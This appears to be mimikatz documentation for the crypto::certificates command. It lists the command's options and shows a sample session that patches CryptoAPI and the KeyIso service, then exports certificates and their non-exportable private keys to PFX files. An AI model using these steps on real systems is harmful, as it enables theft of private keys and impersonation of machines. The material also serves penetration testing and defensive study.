# certificates

`crypto::certificates` lists or exports certificates. It has the following command line arguments:

* `/systemstore`: the system store that must be used (default: `CERT_SYSTEM_STORE_CURRENT_USER`)
* `/store`: the store that must be used to list/export certificates (default: `My`) - full list with `crypto::stores`
* `/export`: export all certificates to files (public parts in `DER`, private parts in `PFX` files - password protected with: `mimikatz`)
* `/silent`: if user interaction is required, then abort
* `/nokey`: do not try to interact with the private key

```
mimikatz # crypto::capi
Local CryptoAPI patched

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::cng
"KeyIso" service patched

mimikatz # crypto::certificates /systemstore:local_machine /store:my /export
 * System Store  : 'local_machine' (0x00020000)
 * Store         : 'my'

 0. example.domain.local
        Key Container  : example.domain.local
        Provider       : Microsoft Software Key Storage Provider
        Type           : CNG Key (0xffffffff)
        Exportable key : NO
        Key size       : 2048
        Public export  : OK - 'local_machine_my_0_example.domain.local.der'
        Private export : OK - 'local_machine_my_0_example.domain.local.pfx'
```
